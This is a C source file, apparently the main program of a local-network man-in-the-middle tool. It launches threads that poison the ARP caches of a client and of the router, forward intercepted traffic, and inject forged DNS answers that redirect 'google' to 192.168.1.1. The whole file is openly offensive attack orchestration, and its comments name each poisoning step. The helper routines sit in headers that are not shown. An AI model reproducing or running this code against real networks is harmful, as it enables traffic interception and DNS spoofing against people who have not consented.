#include <stdio.h>
#include <stdlib.h>
#include "injector.h"
#include "sniffer.h"
#include "protocols/arp.h"
#include "packet_forward.h"
#include "protocols/dns.h"

int main(int argc, char *argv[])
{
    register int  i;
    pthread_t   t[8];
    int         res;
    char        *dns_argv[3];

    if ( argc == 1 )
    {
        fprintf(stderr, "Usage: %s interface\n", argv[0]);
        return -1;
    }
    //wait for arp
    t[0] = SnifferInit(argv[1], ETH_P_ARP, AnalyzeArp, -1, NULL, -1);
    //active request
    t[1] = InjectorInit(argv[1], ETH_P_ARP, GeneralArpRequest, -1,
            NULL, -1);
    //poison client
    t[2] = InjectorInit(argv[1], ETH_P_ARP, ClientArpPoisoning, -1,
            NULL, -1);
    //poison router
    t[3] = InjectorInit(argv[1], ETH_P_ARP, RouterArpPoisoning, -1,
            NULL, -1);
    //packet forward
    //take packets
    t[4] = SnifferInit(argv[1], ETH_P_ALL, AnalyzePacketForward, -1,
            NULL, -1);
    //send them with correct macs
    t[5] = InjectorInit(argv[1], ETH_P_ALL, SendPacketForward, -1,
            NULL, t[4]);
    //dns poison
    t[6] = SnifferInit(argv[1], ETH_P_ALL, AnalyzeDns, -1, NULL,
            -1);
    
    dns_argv[0] = "google";
    dns_argv[1] = "192.168.1.1";
    dns_argv[2] = NULL;

    t[7] = InjectorInit(argv[1], ETH_P_ALL, DnsResponse, -1, dns_argv,
            t[6]);

    for ( i = 0; i < 8; i++ )
    {
        pthread_join(t[i], NULL);
    }
    return 0;
}

